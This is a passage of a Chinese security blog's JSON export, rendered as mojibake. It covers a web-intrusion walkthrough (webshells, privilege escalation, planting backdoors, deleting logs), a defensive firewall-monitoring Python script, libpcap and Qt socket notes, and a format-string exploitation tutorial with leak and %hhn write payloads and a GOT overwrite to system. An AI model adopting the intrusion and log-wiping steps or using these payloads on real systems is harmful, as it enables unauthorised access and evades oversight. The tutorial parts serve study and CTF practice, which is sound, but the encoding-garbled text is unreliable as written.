¹æ®æ‰«æç»“æœæˆ–ç»éªŒï¼Œå°è¯•çœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°åå°ç®¡ç†çš„ç™»å½•é¡µé¢ï¼Œå…ˆå°è¯•ä¸€æ³¢å¼±å£ä»¤ï¼ŒSQLæ³¨å…¥ä»€ä¹ˆçš„ã€‚\n\n- ç°åœ¨å°±å¯ä»¥å°è¯•åˆ†æè¿™ä¸ªWebæœåŠ¡çš„CMSæ¶æ„ï¼Œæ‰¾å‡ºæ¥ä¹‹åå°±å¯ä»¥æ‰¾å¯¹åº”ç‰ˆæœ¬æ¼æ´æ‰“æ‰“è¯•è¯•ï¼Œå°è¯•æ‹¿Webshellã€‚\n\n- ç»è¿‡è‰°è‹¦ä¸æ‡ˆçš„å°è¯•ï¼Œå†åŠ ä¸Šè¿æ°”ï¼Œå¯èƒ½å°±èƒ½æ‹¿Webshelläº†ã€‚è¿™æ—¶å€™è¿›å…¥ä»–çš„WebæœåŠ¡ä¸­ï¼Œå°è¯•ææƒä»€ä¹ˆçš„ï¼Œä¸€å¥è¯æœ¨é©¬ï¼Œå„ç§å°å·¥å…·å•¥çš„ä¸Šå°±å®Œäº†ã€‚\n\n- æäº†ä¸€å †ä¹Ÿä¸å¤ªå¥½ä½¿çš„è¯ï¼Œé‚£å°±å¯èƒ½è¦è¢«å‘ç°äº†ï¼Œè¿™æ—¶å€™ä¸è¦æ…Œï¼Œèµ°ä¹‹å‰åˆ ä¸€åˆ WebæœåŠ¡ä¸Šæ— å…³ç´§è¦çš„å°å›¾ç‰‡ï¼Œå°é“¾æ¥ä»€ä¹ˆçš„ï¼Œç„¶åå°è¯•åˆ è®°å½•é€€å‡ºå•¥çš„ã€‚\n\n- å“ï¼Œè¿™æ—¶å€™å°±å¯ä»¥æ‰“ä¸ªæ¸¸æˆï¼Œåƒä¸ªé¥­ï¼Œç¡ä¸ªè§‰ï¼Œç¬¬äºŒå¤©å†æ¥å°è¯•çœ‹çœ‹ï¼Œå¦‚æœè¿æ°”å¥½æ²¡è¢«å µä¸Šæ¼æ´ï¼Œé‚£å°±çœ‹çœ‹æ—¥å¿—ï¼Œè¿™å…„å¼Ÿçš„ä¸€äº›æ¢å¤æ“ä½œå°±èƒ½å®Œæ•´è¢«æˆ‘ä»¬çŸ¥é“ï¼Œç„¶åæ ¹æ®è¿™äº›æ—¥å¿—æ¥æ‰¾è´¦æˆ·å¯†ç ï¼Œæˆ–è€…æ˜¯ä¸€äº›ç³»ç»Ÿæ“ä½œè°ƒç”¨å•¥çš„ï¼Œæ–¹ä¾¿æˆ‘ä»¬æ‹¿åˆ°æ›´é«˜çº§çš„æƒé™ã€‚\n\n- è¿æ°”å†å¥½äº›æ‹¿åˆ°é«˜æƒé™çš„shellåï¼Œç§ä¸ªåé—¨æœ¨é©¬å°±è·‘è·¯å‘—ï¼Œè®°å¾—åˆ æ—¥å¿—ã€‚\n\n(åƒé‚£ç§æŒ‚äº†å¾ˆå¤šåŸŸåï¼Œæä¾›äº†çœ‹ä¼¼æ­£å¸¸çš„WebæœåŠ¡çš„ï¼Œæœ‰å¾ˆå¤§å¯èƒ½æ˜¯ä¸ªç”¨æ¥ç¿»å¢™æ´—ç™½æµé‡çš„æœåŠ¡å™¨ï¼Œè¿™ç§æœåŠ¡å™¨ä¸€èˆ¬æ¯”è¾ƒå¥½æ‹¿æƒé™ï¼Œå› ä¸ºä½¿ç”¨è€…ä¸€èˆ¬æŒ‚å®ŒæœåŠ¡åéƒ½ä¸ä¼šå†æŠ•å…¥è¿‡å¤šç²¾åŠ›å»ç®¡çš„)\n\nâ–²CMSå•¥çš„å¸¸è§„ä¸ç®¡ç”¨ï¼Œå°±æ‰«ç«¯å£ï¼Œå°è¯•ç«¯å£æœåŠ¡æ¼æ´ç›´æ¥çˆ†ç ´ï¼Œå†ç‰›é€¼ç‚¹ï¼Œä½¿ç”¨0dayæ‰“ã€‚å†å†ç‰›é€¼ç‚¹ï¼Œç›´æ¥ç°åœºæŒ–å¯¹åº”ç‰ˆæœ¬æœåŠ¡çš„æ¼æ´(pwnå¤§ä½¬å¹²çš„æ´»)ã€‚\n\n \n\nâ–²å†è¡¥ä¸€ä¸‹æŠ¤ç½‘å¯¹USGå†™çš„è„šæœ¬ï¼Œæ˜¯åŒå­¦å†™çš„ï¼Œç‰ˆæƒåœ¨ä»–é‚£é‡Œï¼Œç‰¹æ­¤å£°æ˜ã€‚æœ¬æ¥è‡ªå·±æƒ³å†™å¦ä¸€ä¸ªè§£æHTMLçš„è„šæœ¬å´æ€ä¹ˆä¹Ÿä¸æˆåŠŸï¼Œæ°´å¹³è¿˜æ˜¯å¤ªå·®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nimport json\nimport winsound\nimport requests\nimport time\n\nrequests.packages.urllib3.disable_warnings()\n\nurl = \"https://10.10.10.1/=========================\"\n\nheaders = {\n    \"Accept\": \"application/json, text/javascript, */*; q=0.01\",\n    \"Accept-Encoding\": \"gzip, deflate, br\",\n    \"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\",\n    \"Cache-Control\": \"max-age=0\",\n    \"Connection\": \"keep-alive\",\n    \"Cookie\": \"=======================================\",\n    \"Host\": \"10.10.10.1\",\n    \"Sec-Fetch-Dest\": \"document\",\n    \"Sec-Fetch-Mode\": \"navigate\",\n    \"Sec-Fetch-Site\": \"none\",\n    \"Sec-Fetch-User\": \"?1\",\n    \"Upgrade-Insecure-Requests\": \"1\",\n    \"User-Agent\": \"========================================\",\n}\n\nrecorded_ips = set()\n\nwith open(\"blacklistips.txt\", \"r\") as f:\n    recorded_ips = set(f.read().splitlines())\n\nwhile True:\n\n    try:\n        print(time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime(time.time())))\n\n        doc = requests.get(url=url, headers=headers, verify=False)\n\n        if doc.status_code != 200:\n            winsound.Beep(2000, 2000)\n            print(\"æ— æ³•è®¿é—®\")\n            time.sleep(10)\n            continue\n\n        json_dict = json.loads(doc.text)\n        data = json_dict[\"data\"]\n        for attack in data:\n            ip = attack[\"name\"]\n            hasRisk = (\n                int(attack[\"middle\"]) > 0\n                or int(attack[\"high\"]) > 0\n                or int(attack[\"critical\"]) > 0\n            )\n\n            if not hasRisk:\n                continue\n\n            if ip in recorded_ips:\n                continue\n\n            print(attack)\n            winsound.Beep(2000, 2000)\n            recorded_ips.add(ip)\n\n        with open(\"blacklistips.txt\", \"w\") as f:\n            for data in recorded_ips:\n                f.write(data + \"\\n\")\n        print(\"å¹³å¹³å®‰å®‰\")\n        time.sleep(30)\n\n    except Exception as err:\n        print(err)\n        winsound.Beep(2000, 2000)\n        time.sleep(10)\n```\n\n \n\nâ–²æœ€ååšä¸ªæ€»ç»“ï¼Œå­¦äº†è¿™äº›å¤©ä¸‹æ¥ï¼Œæ„Ÿè§‰Webå¤ªæ‚å¤ªä¹±ï¼Œè¾¹è¾¹è§’è§’å¤ªå¤šï¼Œè€Œä¸”æ›´æ–°é€Ÿåº¦æå¿«ï¼Œå¯èƒ½è¿‡ä¸ªä¸€ä¸¤ä¸ªæœˆå°±è¿‡æ—¶çš„ï¼Œå®åœ¨æ˜¯ä¸é€‚åˆåƒæˆ‘è¿™ç§åˆè ¢åˆæ‡’ï¼Œè„‘å®¹é‡åˆå°çš„èœé¸¡å»æã€‚\n\nè¿˜æ˜¯æ„Ÿè§‰ç°åœ¨æ·±å…¥æWebä¸åˆ°æ—¶å€™ï¼Œåœ¨æ ¡æœŸé—´æ›´é€‚åˆå­¦äº›åŸºç¡€ç†è®ºçš„ä¸œè¥¿ï¼Œæ‰€ä»¥ä¹‹åè¿˜æ˜¯å›è€æœ¬è¡ŒæäºŒè¿›åˆ¶å»å§ï¼Œèµ·ç è¿™äº›ç†è®ºçŸ¥è¯†æ›´æ–°æ¢ä»£æ¯”è¾ƒæ…¢ä¸€ç‚¹ã€‚å¹¶ä¸”è¿™ç§æ›´æ–°æ›´åƒæ˜¯ä¸€ç§åŸºäºç†è®ºæ¥åƒå˜ä¸‡åŒ–çš„ï¼Œè€Œä¸åƒWebå¥½å¤šéƒ½æ˜¯é‚£ç§ä¸€æ›´æ–°å°±å®Œå…¨å˜æˆæ–°ä¸œè¥¿ï¼Œæ²¡å¤šå°‘ç†è®ºä¾æ®å¯è¨€ï¼Œç›´æ¥å°±æ˜¯å¼€è„‘æ´çš„ã€‚\n\nè¿˜æ˜¯æäºŒè¿›åˆ¶å»å§ï¼Œé»‘å®¢çš„ç†æƒ³è¿˜æ˜¯ç­‰ä»¥åå·¥ä½œäº†å†æ¥ã€‚\n","tags":["WEB"],"categories":["WEB"]},{"title":"æš‘æœŸæ€»ç»“","url":"/2021/08/14/æš‘æœŸæ€»ç»“/","content":"\nå°å­¦æœŸä¸€ç›´åœ¨å¿™å°ç¨‹åºçš„è®¾è®¡ï¼Œç°åœ¨æ”¾ä¸Šæ¥å§ï¼Œä¹Ÿæœ€ååšä¸ªæ€»ç»“ï¼š\n\nä¸€ã€Libcapçš„ä½¿ç”¨ï¼š\n\n1.å¤´æ–‡ä»¶ç¯å¢ƒç›¸å…³ï¼š\n\nç”¨çš„æ˜¯ubuntu18.04çš„ç¯å¢ƒ\n\n(1)å¤´æ–‡ä»¶åŠç¯å¢ƒé…ç½®ï¼š\n\n```c\n//æ³¨é‡Šå¤´\n\n\n#include <pcap.h>\n\n//cmd Programmer need\n-lpcap\n\n//QT pro need\nLIBS += -L/usr/local/lib -lpcap\n```\n\nåŒæ—¶éœ€è¦rootæƒé™ï¼ŒQTå¯ä»¥è®¾ç½®\n\n(2)QThreadä½¿ç”¨\n\n```c\n//æ³¨é‡Šå¤´\n\nclass libcapThread : public QThread\n{\n    Q_OBJECT\npublic:\n    //overwrite\n    void run();\n\n\nsignals:\n    void signalpcap(QString,QString,QString,\n        QString,QString,const u_char*);\n};\n//æ³¨é‡Šå¤´\n\nthreadObj->start();\nthreadObj->terminate();\n```\n\n2.æŠ“åŒ…æµç¨‹ï¼š\n\n(1)æœç´¢ç½‘å¡devï¼š\n\ndev = pcap_lookupdev(errbuf);\n\nè¿™ä¸ªåªèƒ½æœç´¢åˆ°ç¬¬ä¸€ä¸ªå¯ç”¨ç½‘å¡ï¼Œæœ‰çš„è£…äº†dockerå•¥çš„ä¼šå­˜åœ¨å¤šä¸ªç½‘å¡ï¼Œéœ€è¦ç”¨å…¶ä»–å‡½æ•°ã€‚\n\n(2)ç¼–è¯‘æŠ“å–è§„åˆ™ï¼š\n\npcap_compile(devHandle, &filter, \"tcp\", 0, deviceMask);\n\n(3)è®¾ç½®æŠ“å–è§„åˆ™ï¼š\n\npcap_setfilter(devHandle, &filter);\n\n(4)æŠ“åŒ…ï¼š\n\npcap_loop(devHandle, 1, baseAnalyze, NULL);\n\nâ–²å¤§æ¦‚å°±æ˜¯è¿™æ ·ï¼Œç„¶åè¿™é‡Œä¸€èˆ¬éœ€è¦ç”¨åˆ°å›è°ƒå‡½æ•°baseAnalyze()æ¥å¤„ç†åŒ…æ•°æ®ï¼Œå›è°ƒå‡½æ•°å¯è‡ªè¡Œå¾—åˆ°çš„å‚æ•°å¦‚ä¸‹ï¼š\n\nvoid baseAnalyze(u_char* user, const struct pcap_pkthdr* pHeader, const u_char* pPktdata)\n\n3.ç„¶åå°±æ˜¯æ­£å¸¸å¤„ç†æ˜¾ç¤ºäº†ï¼Œç›´æ¥è´´ç¨‹åº:\n\nhttps://github.com/PIG-007/Programmer/tree/master/Libcap\n\n \n\näºŒã€åŠ è§£å¯†åŒæœºçš„ä½¿ç”¨ï¼š\n\nâ–²åšäº†åŒæœºçš„æœåŠ¡å™¨ç«¯å’ŒDESï¼ŒAESï¼Œè¿˜æœ‰å‡ ä¸ªå¤å…¸ï¼Œå…¶ä»–çš„æ˜¯åŒå­¦åšçš„ï¼Œç‰¹æ­¤è¯´æ˜ä¸€ä¸‹ã€‚\n\n1.Socket\n\n(1)åˆ›å»ºå¯¹è±¡ï¼š\n\n```c\n//æ³¨é‡Šå¤´\n\nserver = new QTcpServer(this);\n```\n\n(2)å¼€å§‹ç›‘å¬ï¼š\n\n```c\n//æ³¨é‡Šå¤´\n\nconnect(ui->btnListen,&QPushButton::clicked,[this]{\n    //if Listening,close it\n    if(server->isListening()){\n    //server->close();\n    closeServer();//Define function\n    //Recover the status after closed\n    }else{\n        const QString address_text=ui->editAddress->text();\n        const QHostAddress address=(address_text==\"Any\")\n            ?QHostAddress::Any\n            :QHostAddress(address_text);\n        const unsigned short port=ui->editPort->text().toUShort();\n        if(server->listen(address,port)){\n        //handle function\n        }else{\n            //error function\n        }\n    }\n}\n```\n\n(3)æ£€æµ‹åˆ°è¿æ¥ï¼Œå¼€å§‹å¤„ç†ï¼š\n\n```c\n//æ³¨é‡Šå¤´\n\nconnect(server,&QTcpServer::newConnection,this,[this]{\nwhile(server->hasPendingConnections())\n{\n    //nextPendingConnection get the next obj\n    QTcpSocket *socket=server->nextPendingConnection();\n    clientList.append(socket);\n    ui->textRecv->append(QString(\"(%1:%2) Soket Connected\")\n        .arg(socket->peerAddress().toString())\n        .arg(socket->peerPort()));\n        ui->textRecv->append(recv_text);\n});\n```\n\n(4)é”™è¯¯ä¿¡æ¯å¤„ç†ï¼š\n\n```c\n//æ³¨é‡Šå¤´\n\nconnect(socket, static_cast<void(QAbstractSocket::*)(QAbstractSocket::SocketError)>(&QAbstractSocket::error),\n[this,socket](QAbstractSocket::SocketError)\n{\n//Handle\n});\n//æ³¨é‡Šå¤´\n\nconnect(socket,&QAbstractSocket::errorOccurred,[this,socket](QAbstractSocket::SocketError)\n{\n//Handle\n});\n```\n\n2.ç•Œé¢è®¾è®¡çš„ä¸åŒstyle:\n\n```c\n//æ³¨é‡Šå¤´\n\nqApp->setStyle(QStyleFactory::create(\"fusion\"));\n```\n\n3.åŠ å¯†æ¨¡å—ï¼š\n\nå¾ˆå¤šå†…å®¹å°±æ”¾githubä¸Šï¼Œä¸å†èµ˜è¿°\n\nhttps://github.com/PIG-007/Programmer/tree/master/SocketEncrypt\n\n \n\n","tags":["å­¦ä¹ "],"categories":["å­¦ä¹ "]},{"title":"æ ¼å¼åŒ–å­—ç¬¦printfæ±‡æ€»","url":"/2021/08/14/æ ¼å¼åŒ–å­—ç¬¦printfæ±‡æ€»/","content":"\nâ–²printfçš„æ€§è´¨ï¼š\n\nâ–²å‚æ•°%sï¼šè¿™ä¸ªå‚æ•°å…¶æœ¬è´¨ä¸Šæ˜¯è¯»å–å¯¹åº”çš„å‚æ•°ï¼Œå¹¶ä½œä¸ºæŒ‡é’ˆè§£æï¼Œè·å–åˆ°å¯¹åº”åœ°å€çš„å­—ç¬¦ä¸²è¾“å‡ºã€‚å¯ä»¥é€šè¿‡è¿™ä¸ªæ€§è´¨æ¥æ³„éœ²æŸä¸ªå†…å­˜åœ°å€çš„å†…å®¹ï¼š\n\nä¾‹å­ï¼š\n\nå¦‚æœè¾“å…¥ä¸€ä¸ª%Sï¼Œåœ¨è°ƒç”¨printfä¹‹å‰ï¼Œæ ˆä¸Šä¼šæ˜¯è¿™ç§æ•°æ®ï¼Œæœ‰ä¸¤ä¸ªç›¸åŒçš„æŒ‡å‘%Sï¼Œä¸€ä¸ªæ˜¯ä¼šè§£ææˆå‚æ•°%Sï¼Œä¸€ä¸ªä¼šä½¿ç”¨è§£æçš„å‚æ•°%Sä½œç”¨æ¥æ‰“å°è¾“å…¥çš„%Sã€‚è¿™é‡Œå¯ä»¥è®¡ç®—å‡ºåç§»é‡ä¸º6ï¼Œå³ä»æ ˆé¡¶æ•°ç¬¬6ä¸ªå¯ä»¥åˆ°è¾¾æˆ‘ä»¬è¾“å…¥çš„å†…å®¹0x0a7325ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191542914.png)\n\n \n\n1.æ³„éœ²ä»»æ„åœ°å€å†…å®¹\n\n```\n#æ³¨é‡Šå¤´\n\n\\x01\\x80\\x04\\x08%x.%x.%x.%x.%s\n```\n\nè¿™ä¸€æ®µå³æ‰“å°ä»æ ˆé¡¶å¾€ä¸‹æ•°5ä¸ªå†…å®¹çš„æ ˆä¸­ä¿å­˜çš„å€¼ï¼Œç”±äºç¬¬5ä¸ªå‚æ•°æ˜¯%sï¼Œæ‰€ä»¥ä¼šå°†ç¬¬5ä¸ªå†…å®¹å½“ä½œä¸€ä¸ªåœ°å€æ¥è§£æï¼Œä»è€Œæ‰“å°ä½äºè¯¥åœ°å€ä¸Šçš„å€¼ã€‚æ‰€ä»¥è¾“å‡ºåº”è¯¥ä¸º0xff95abb4,0x0000012B,0x08048465.....(è¿™éƒ½æ˜¯æ ˆä¸Šçš„å†…å­˜),æœ€åç¬¬äº”ä¸ªå†…å®¹æ˜¯0x08040801ï¼Œç”¨å‚æ•°%sæ¥è§£æï¼Œå³æ‰“å°è¯¥åœ°å€ä¸Šä¿å­˜çš„å†…å®¹ï¼Œåœ°å€å¯¹åº”çš„å€¼ä¸ºâ€ELF\\x01\\x01\\x01\\nâ€ï¼Œè¿™æ ·å°±å¯ä»¥æ‰“å°ä»»æ„å†…å­˜åœ°å€çš„å€¼ã€‚å¸¸ç”¨æ¥ä¼ å…¥gotè¡¨åœ°å€ï¼Œç„¶åå€ŸåŠ©è¯¥å‡½æ•°æ³„éœ²æŸå‡½æ•°gotè¡¨ä¸­çš„å€¼ï¼Œå³æ˜¯æ³„éœ²è¯¥å‡½æ•°çš„çœŸå®åœ°å€ã€‚\n\nâ–²ç®€åŒ–ä½¿ç”¨ï¼š\n\nå¦‚æœè¾“å…¥çš„å‚æ•°ä¿å­˜åœ¨æ ˆä¸Šå¾ˆè¿œçš„ä½ç½®ï¼Œé‚£ä¹ˆåˆ™éœ€è¦å åŠ %xï¼Œä½†æ˜¯å®é™…ä¸­å¯ä»¥ä½¿ç”¨ç®€å•çš„åç§»æ¥æ‰“å°ï¼š\\x01\\x80\\x04\\x08%5$sï¼Œå…¶ä¸­5å°±ä»£è¡¨ä»espå¼€å§‹è®¡ç®—åç§»é‡ä¸º6ã€‚\n\næ€»çš„æ¥è¯´å°±æ˜¯ä¸€ä¸ªå…¬å¼ï¼Œè¾“å‡ºåç§»é‡ä¸ºnçš„å‚æ•°çš„å€¼å°±æ˜¯ï¼š\n\n%(n-1)$s\n\n(%[addr_offset_value]$[æ ¼å¼åŒ–æ§åˆ¶å­—ç¬¦])\n\n \n\n2.ä»»æ„åœ°å€å¯å†™ï¼š\n\nç‰¹æ®Šæ ¼å¼åŒ–å­—ç¬¦%nå®¶æ—ï¼š\n\n(1)è¿™ä¸ªå­—ç¬¦ä¼šå°†å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°å†™å…¥åˆ°æŒ‡å®šå†…å­˜ä¸­ï¼Œä¾‹å¦‚\\x8c\\x97\\x04\\x08%[addr_offset_value]$nï¼Œè¿™æ®µæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¼šä½¿å¾—åœ°å€0x0804978cå¤„çš„å†…å®¹å˜æˆ4ï¼Œå› ä¸ºè¿™ä»£è¡¨äº†è¾“å‡ºäº†\\x8c\\x97\\x04\\x08è¿™å››ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ä¼šå‘0x0804978cè¿™ä¸ªåœ°å€å†™å…¥4ï¼Œå®é™…æ˜¯å†™å…¥00 00 00 04ï¼Œå…±è®¡å››ä¸ªå­—èŠ‚ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å¯ä»¥ä¿®æ”¹æŸä¸ªåœ°å€çš„å€¼ã€‚\n\n(2)\\x8c\\x97\\x04\\x08%2048c%(addr_offset_value)$nï¼šè¿™ä¸ªä»£ç ä¼šå°†2052ï¼Œå®é™…æ˜¯(00 00 08 04) ï¼Œå…±è®¡å››ä¸ªå­—èŠ‚å†™å…¥åˆ°åœ°å€0x0804978cï¼Œå› ä¸ºè°ƒç”¨äº†printfä¼šå…ˆæ‰“å°\\x8c\\x97\\x04\\x08å››ä¸ªå­—ç¬¦ï¼Œç„¶åä¾æ®æ ¼å¼åŒ–å­—ç¬¦%2048cï¼Œå†æ‰“å°2048ä¸ªç©ºå­—ç¬¦ï¼Œå®é™…æ‰“å°äº†2048+4=2052ä¸ªå­—ç¬¦ï¼Œå¯¹åº”16è¿›åˆ¶ä¸º0x804ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨æ˜¯éœ€è¦å‡å»åœ¨%è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦æ ‡å¿—å‰çš„å­—ç¬¦çš„ä¸ªæ•°æ‰æ˜¯å¯¹åº”çš„å€¼ã€‚\n\n(3)ä½†æ˜¯åœ¨å®é™…ä¸­ï¼Œå¦‚æœæˆ‘ä»¬æƒ³å°†ä¸€ä¸ªåœ°å€çš„å€¼å†™å…¥åˆ°æŸä¸ªåœ°å€ï¼Œä½¿å¾—å¯ä»¥è°ƒç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦è¾“å…¥çš„å°±ä¼šå˜æˆ0x8xxx....è½¬æ¢æˆåè¿›åˆ¶åˆ™ä¼šç‰¹åˆ«å¤§ï¼Œä¼šå‘æœåŠ¡å™¨å‘é€0x8000...ä¸ªå­—ç¬¦ï¼Œè¿™åœ¨å®é™…ä¸­å¾ˆå®¹æ˜“å‡ºé”™ã€‚è¿™æ—¶å€™éœ€è¦ç”¨åˆ°å¦ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦æ§åˆ¶ï¼š%hhnã€‚\n\n(4)ç‰¹æ®Šæ ¼å¼åŒ–å­—ç¬¦%hhnï¼šè¿™ä¸ªå­—ç¬¦å¯ä»¥ä½¿å¾—ä¸€æ¬¡å¾€æŒ‡å®šåœ°å€å†™å…¥ä¸€ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†æˆ‘ä»¬éœ€è¦è¾“å…¥çš„åœ°å€ç»™æ‹†åˆ†æˆ4ä¸ªå­—èŠ‚æ¥è¾“å…¥ã€‚\n\n(5)ä¾‹å¦‚\n\n\\x78\\x97\\x04\\x08\\x79\\x97\\x04\\x08\\x7a\\x97\\x04\\x08\\x7b\\x97\\x04\\x08%16c%5$hhn%99c%6$hhn%129c%7$hhn%4c%8$hhn\n\nè¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ç›¸å½“äºå››ä¸ªæ“ä½œï¼š\n\nâ‘ \\x78\\x97\\x04\\x08%16c%5$hhnï¼šæ”¹å˜åœ°å€0x08049778çš„å€¼ä¸º0x20ã€‚\n\nè¿™é‡Œæ˜¯20æ˜¯å› ä¸ºå‰é¢å·²ç»è¾“å‡ºäº†\\x78\\x97\\x04\\x08\\x79\\x97\\x04\\x08\\x7a\\x97\\x04\\x08\\x7b\\x97\\x04\\x08æ€»å…±16ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å®é™…å†™å…¥åˆ°åœ°å€0x08049778çš„å€¼ä¸º16+16=32=0x20ã€‚\n\nâ‘¡\\x79\\x97\\x04\\x08%99c%6$hhn:æ”¹å˜åœ°å€0x08049779çš„å€¼ä¸º99+32=131=0x83ï¼ŒåŒç†ï¼Œå› ä¸ºå‰é¢å·²ç»è¾“å‡ºäº†32ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æœ€ç»ˆå†™å…¥å€¼ä¸º0x83ã€‚\n\nâ‘¢\\x7a\\x97\\x04\\x08%129c%7$hhnï¼šæ”¹å˜åœ°å€0x0804977açš„å€¼ä¸º129+131=260=0x104ï¼Œè¿™é‡Œç”±äºæ˜¯ä½¿ç”¨%hhnï¼Œæ‰€ä»¥åªèƒ½å†™å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ä¼šè¢«æˆªæ–­ä¸º0x04\n\nâ‘£\\x7b\\x97\\x04\\x08%4c%8$hhnï¼šæ”¹å˜åœ°å€0x0804977bçš„å€¼ä¸º4+0x104=0x108=0x08ã€‚æ‰€ä»¥æœ€ç»ˆå†™å…¥åˆ°åœ°å€0x08049778ä¸­çš„å››ä¸ªå­—èŠ‚ä¸º0x08048320ï¼Œå®Œæˆå†™å…¥åœ°å€ã€‚\n\næ€»çš„å…¬å¼:\n\n[addr]%[padding_count]c%[addr_offset_value]$[æ ¼å¼åŒ–æ§åˆ¶å­—ç¬¦]\n\nâ–²æ³¨æ„åç§»é‡ä¸€ç›´åœ¨é€’å¢ã€‚è¿˜æœ‰å°±æ˜¯å› ä¸ºè¿™æ˜¯å¤§ç«¯å­˜å‚¨ï¼Œæ‰€ä»¥å†™å…¥çš„é¡ºåºéœ€è¦è®¡ç®—ä¸€ä¸‹ï¼Œé˜²æ­¢å‡ºç°\\x00å¯¼è‡´å­—ç¬¦ä¸²è¾“å…¥æˆªæ–­ã€‚\n\n \n\nâ–²ç‰¹æ®Šæ ¼å¼åŒ–å­—ç¬¦ä¸²è°ƒç”¨ç±»ï¼šFmtstr\n\nä»¥ä¸Šçš„å¯ä»¥ç›´æ¥æ”¹æˆï¼šfmtstr_payload(5, {printf_got_addr:system_plt})å°†æ ˆä¸Šåç§»é‡ä¸º6çš„å€¼æ”¹æˆprintf_got_addrï¼ŒåŒæ ·å°†printf_got_addrçš„å€¼ä¿®æ”¹ä¸ºsystem_plt_addrã€‚ä¹Ÿå°±æ˜¯åœ¨ç¬¬ä¸€æ¬¡ç”¨pringtfæ—¶ï¼Œä¼šä¿®æ”¹æ ˆå’ŒåŠ«æŒprintf_got_addrä¸ºsystem_plt_addrã€‚ä¸‹ä¸€æ¬¡å†è°ƒç”¨printfæ—¶ï¼Œä»printf_got_addræŒ‡å‘çš„å°±ä¼šæ˜¯system_plt_addrï¼Œå®ŒæˆåŠ«æŒã€‚\n\nä½†æ˜¯å¦‚æœä¸€æ—¦printf_got_addrå‡ºç°\\x00æˆ–è€…ä¸åŒè¾“å…¥å‡½æ•°æ‰€å¯¹åº”çš„éæ³•å­—ç¬¦ï¼Œå°±ä¼šå‘ç”Ÿæˆªæ–­ï¼Œå¯¼è‡´å‡ºé”™ã€‚å› ä¸ºFmtstræ¨¡å—åˆ›é€ çš„payloadä¸­åœ°å€ä¼šè¢«åˆ‡å‰²æˆå‡ æ®µï¼Œç›¸å½“äºæˆ‘ä»¬çš„å¤šæ®µæ‰§è¡Œï¼Œé‚£ä¹ˆæœ€åçš„å‡ ä¸ªåœ°å€å¦‚æœå…¶ä¸­ä¸€ä¸ªå¸¦äº†éæ³•å­—ç¬¦å°±ä¼šå‡ºé”™ã€‚\n\n \n\nâ–²printfå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å¸¸è§æœ‰\n\n(1)%dï¼Œ%fï¼Œ%cï¼Œ%sï¼Œï¼ˆç”¨äºè¯»å–å†…å­˜æ•°æ®ï¼‰\n\n(2)%xï¼ˆè¾“å‡º16è¿›åˆ¶æ•°ï¼Œå‰é¢æ²¡æœ‰0xï¼‰ï¼Œ%pï¼ˆè¾“å‡º16è¿›åˆ¶æ•°ï¼Œå‰é¢å¸¦æœ‰0xï¼‰\n\n(3)é™¤äº†%nï¼Œ%hnï¼Œ%hhnï¼Œ%llnï¼Œåˆ†åˆ«å¯¹åº”å†™å…¥ç›®æ ‡ç©ºé—´4å­—èŠ‚ï¼Œ2å­—èŠ‚ï¼Œ1å­—èŠ‚ï¼Œ8å­—èŠ‚ã€‚\n\nâ–²ç”±äºä½¿ç”¨%nä¹‹ç±»çš„æ§åˆ¶å­—ç¬¦ï¼Œè¾“å…¥çš„str(addr)ä¸ºä»¥å­—ç¬¦ä¸²å½¢å¼è¾“å…¥ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šè½¬æ¢æˆåè¿›åˆ¶ç„¶åè½¬æ¢æˆå¯¹åº”çš„asciiç æ¥å­˜å‚¨åœ¨æ ˆä¸Šï¼Œæ‰€ä»¥ä¸ä¼šå‡ºç°0x00è¿™ç±»çš„å­—ç¬¦ã€‚ä½†æ˜¯å¦‚æœæ˜¯éœ€è¦å†™å…¥çš„åœ°å€ï¼Œä½¿ç”¨çš„æ˜¯p64æˆ–è€…p32ï¼Œè¿™ä¸ªå°±æ˜¯ç›´æ¥å¯¹åº”çš„ï¼Œå¦‚æœè¿™ä¸ªåœ°å€ä¸­æœ‰00ï¼Œé‚£ä¹ˆå°±ä¸ä¼šè¢«readå‡½æ•°è¯»å–è¿›å…¥ã€‚å› ä¸ºreadå‡½æ•°é»˜è®¤ç»“å°¾æ˜¯0x00ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²ç»“æŸç¬¦å·ã€‚æ‰€ä»¥è¿™ç§æƒ…å†µä¸‹ä¸€èˆ¬éƒ½æ˜¯å°†p64(addr)æ”¾åœ¨payloadçš„æœ«å°¾ï¼Œä»è€Œè‡ªåŠ¨ç”Ÿæˆ00ï¼Œä¸ä¼šå¯¼è‡´è¢«æˆªæ–­ã€‚\n\n \n\nâ˜…æŠ€å·§æ€»ç»“:\n\n1.åŠ«æŒæŸå‡½æ•°ä¸ºsystemå‡½æ•°æ—¶ï¼Œæ˜¯å°†Gotè¡¨åŠ«æŒä¸ºpltè¡¨ï¼Œå¹¶ä¸”è¯¥å‡½æ•°çš„æ€»ä½“ç»“æ„åº”è¯¥ä¸systemå‡½æ•°ç±»ä¼¼ï¼Œå‚æ•°åº”è¯¥æ˜¯ä¸€ä¸ªåœ°å€ã€‚\n\n2.fmtstræ¨¡å—çš„ç”¨æ³•éœ€è¦æ³¨æ„ï¼Œæœ‰æ—¶å€™ä¹Ÿä¸å¤ªå¥½ç”¨ã€‚\n\n 